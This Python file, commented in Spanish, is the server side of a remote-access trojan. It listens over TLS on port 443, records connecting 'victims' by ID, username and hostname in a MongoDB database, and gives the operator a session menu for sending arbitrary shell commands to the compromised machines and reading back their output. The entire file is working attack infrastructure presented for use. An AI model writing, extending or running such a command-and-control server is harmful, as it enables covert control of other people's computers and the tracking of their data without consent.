import socket
import ssl
import threading
import queue
from datetime import datetime
import pymongo
from pymongo import MongoClient # Importa MongoClient
from pymongo.errors import ConnectionFailure
import json

# --- Configuracion de MongoDB ---
mongo_uri = "mongodb://localhost:27017/" # Tu URI de MongoDB
# Los siguientes se inicializaron en init_mongodb
mongo_client = None
mongo_db = None
mongo_collection = None

def init_mongodb():
    global mongo_client, mongo_db, mongo_collection
    try:
        mongo_client = MongoClient(mongo_uri)
        # Ping para verificar la conexion
        mongo_client.admin.command('ping')
        mongo_db = mongo_client['clientes'] # Tu nombre de base de datos
        mongo_collection = mongo_db['conexiones'] # Tu nombre de coleccion
        print("[+] Conexion a MongoDB establecida exitosamente.")
    except ConnectionFailure as e:
        print(f"[!] Fallo al conectar a MongoDB: {e}")
        print("[!] Asegurate de que MongoDB esta corriendo y sea accesible.")
        # Aqui puedes decidir si el programa debe salir o intentar reconectar
        exit(1) # Salir si no se puede conectar a la base de datos
    except Exception as e:
        print(f"[!] Error inesperado al iniciar MongoDB: {e}")
        exit(1) # Salir en caso de otros errores


LHOST = '0.0.0.0'
LPORT = 443
BUFFER_SIZE = 4096

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
context.load_cert_chain(certfile="/etc/letsencrypt/live/winserver.eastus.cloudapp.azure.com/fullchain.pem", keyfile="/etc/letsencrypt/live/winserver.eastus.cloudapp.azure.com/privkey.pem")

sessions = []
lock = threading.Lock()

class ClientSession:
    def __init__(self, conn, addr, initial_data):
        self.conn = conn
        self.addr = addr
        self.initial_data = initial_data
        self.output = queue.Queue()
        self.active = True
        self.buffer = ""
        self.thread = threading.Thread(target=self.listen_to_client, daemon=True)
        self.thread.start()
        
        # Manten esta logica si quieres asegurar que _id siempre es string para la impresion
        printable_data = initial_data.copy()
        if '_id' in printable_data and not isinstance(printable_data['_id'], str):
            printable_data['_id'] = str(printable_data['_id'])
        #print(f"[+] Sesion iniciada para {addr}. Datos iniciales: {json.dumps(printable_data, indent=2)}")


    def listen_to_client(self):
        while self.active:
            try:
                data = self.conn.recv(BUFFER_SIZE)
                if not data:
                    print(f"[*] Cliente {self.addr} ha cerrado la conexion.")
                    break
                
                self.buffer += data.decode('utf-8', errors='replace')
                
                while '\n' in self.buffer:
                    line, self.buffer = self.buffer.split('\n', 1)
                    
                    # Esta logica de prompt ahora solo atrapara el ">" que el cliente envia
                    # cuando el comando desde el servidor fue vacio.
                    if line == ">": # Cambiado de startswith("> ") a == ">" ya que el cliente envia solo ">" + '\n'
                        print(f"[*] Cliente {self.addr} esta listo (recibido prompt de comando vacio).")
                        continue 

                    try:
                        parsed_json = json.loads(line)
                        if parsed_json.get("type") == "initial_info":
                            print(f"[!] Error: Se recibio un mensaje inicial de nuevo para {self.addr}. (DEBUG)")
                        else:
                            self.output.put(json.dumps(parsed_json, indent=2))
                            print(f"[>] Datos JSON de {self.addr}: {line}")
                            
                    except json.JSONDecodeError:
                        self.output.put(line)
                        #print(f"[>] Salida de comando de {self.addr}: {line}")
            except Exception as e:
                print(f"[!] Error al escuchar cliente {self.addr}: {e}")
                break
        self.active = False
        self.conn.close()
        print(f"[x] Sesion de {self.addr} terminada.")

    def send_command(self, cmd):
        try:
            # Aqui agregamos el salto de linea para que el cliente lo reciba como una linea de comando
            self.conn.send((cmd + '\n').encode('utf-8')) 
        except Exception as e:
            print(f"[!] Error al enviar comando: {e}")
            self.active = False

    def read_output(self):
        out_lines = []
        while not self.output.empty():
            out_lines.append(self.output.get())
        return "\n".join(out_lines) if out_lines else "[sin salida]"



def handle_new_connection(conn, addr):
    global mongo_collection # Asegurate de que esto siga siendo global
    buffer = ""
    try:
        while True:
            data = conn.recv(BUFFER_SIZE)
            if not data:
                print(f"[!] Conexion de {addr} cerrada antes de recibir datos iniciales.")
                conn.close()
                return

            buffer += data.decode("utf-8", errors='replace')
            if '\n' in buffer:
                json_line, _ = buffer.split('\n', 1)
                try:
                    initial_info = json.loads(json_line)
                    if initial_info.get("type") == "initial_info":
                        #print(f"[*] Recibido JSON inicial de {addr}: {json.dumps(initial_info, indent=4)}")
                        
                        if 'victim_id' in initial_info:
                            victim_identifier = initial_info['victim_id']
                            initial_info['_id'] = victim_identifier
                            # Opcional: puedes eliminar el campo 'victim_id' si no quieres duplicarlo
                            del initial_info['victim_id']
                            
                        if mongo_collection is not None:
                            try:
                                # Buscar el documento existente por su _id (victim_id)
                                existing_doc = mongo_collection.find_one({'_id': victim_identifier})
                                current_time = datetime.now() # Obtener la fecha y hora actual

                                if existing_doc:
                                    # Si el documento existe, solo actualizamos last_connection
                                    # y los campos que puedan haber cambiado
                                    update_fields = initial_info.copy()
                                    update_fields['last_connection'] = current_time
                                    
                                    result = mongo_collection.update_one(
                                        {'_id': victim_identifier},
                                        {'$set': update_fields}
                                    )
                                    if result.modified_count > 0:
                                        print(f"[+] Datos de victima ACTUALIZADOS en MongoDB para _id: {victim_identifier} (reconexion).")
                                    else:
                                        print(f"[*] Datos de victima ya existentes y NO MODIFICADOS para _id: {victim_identifier} (sin cambios).")

                                else:
                                    # Si el documento NO existe, es la primera conexion
                                    initial_info['first_connection'] = current_time
                                    initial_info['last_connection'] = current_time
                                    
                                    result = mongo_collection.update_one(
                                        {'_id': victim_identifier},
                                        {'$set': initial_info},
                                        upsert=True # Esto creara el documento si no existe
                                    )
                                    if result.upserted_id:
                                        print(f"[+] Datos de victima INSERTADOS en MongoDB con _id: {result.upserted_id} (primera conexion).")
                                    else:
                                        print(f"[!] Advertencia: No se pudo insertar el documento para {victim_identifier} aunque no existia.")

                            except Exception as e:
                                print(f"[!] Error al guardar en MongoDB: {e}")
                        else:
                            print("[!] MongoDB no esta conectado, no se guardaron los datos.")

                        session = ClientSession(conn, addr, initial_info)
                        with lock:
                            sessions.append(session)
                        print(f"[+] Nueva sesion registrada: {addr} - ID Victima: {initial_info.get('_id', 'N/A')}")
                        return

                    else:
                        print(f"[!] Primer mensaje de {addr} no es el JSON inicial esperado. Cerrando conexion.")
                        conn.close()
                        return

                except json.JSONDecodeError:
                    print(f"[!] Primer mensaje de {addr} no es un JSON valido. Cerrando conexion.")
                    conn.close()
                    return
                break
            
    except Exception as e:
        print(f"[!] Error al manejar nueva conexion de {addr}: {e}")
        conn.close()

def accept_connections(tls_server):
    while True:
        try:
            conn, addr = tls_server.accept()
            threading.Thread(target=handle_new_connection, args=(conn, addr), daemon=True).start()
        except Exception as e:
            print(f"[!] Error al aceptar conexion: {e}")

def session_menu():
    while True:
        print("\n=== Gestor de Sesiones ===")
        with lock:
            for idx, s in enumerate(sessions):
                status = "Activa" if s.active else "Cerrada"
                victim_id_short = s.initial_data.get('victim_id', 'N/A')[:8] + "..."
                username = s.initial_data.get('username', 'N/A')
                hostname = s.initial_data.get('hostname', 'N/A')
                print(f"[{idx}] {s.addr} - ID: {victim_id_short} | Usuario: {username} | Host: {hostname} ({status})")
        print("[x] Salir")

        choice = input("Selecciona una sesion (numero) > ")
        if choice.lower() == 'x':
            # Salir del menu de sesiones
            print("[~] Saliendo del gestor de sesiones.")
            for session in sessions:
                if session.active:
                    session.active = False
                    session.conn.close()
            print("[~] Todas las sesiones activas han sido cerradas.")
            break

        try:
            idx = int(choice)
            with lock:
                session = sessions[idx]
            if not session.active:
                print("[!] Esta sesion esta cerrada.")
                continue
            control_session(session)
        except (IndexError, ValueError):
            print("[!] Seleccion invalida.")

def control_session(session):
    print(f"[*] Interactuando con {session.addr} - Escribe 'back' para volver al menu.\n")
    while session.active:
        cmd = input("CMD > ")
        if cmd.lower() == "back":
            print("[~] Saliendo de la sesion.")
            return
        session.send_command(cmd)
        print("[~] Esperando salida...")
        # Espera breve para acumular la salida
        threading.Event().wait(0.5)
        output = session.read_output()
        print(output)
    print("[x] Sesion cerrada.")

def main():
    init_mongodb() # Esto inicializara variables globales de MongoDB
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((LHOST, LPORT))
        server_socket.listen(5)
        print(f"[+] Servidor TLS escuchando en {LHOST}:{LPORT}")

        with context.wrap_socket(server_socket, server_side=True) as tls_server:
            threading.Thread(target=accept_connections, args=(tls_server,), daemon=True).start()
            session_menu()

if __name__ == "__main__":
    main()
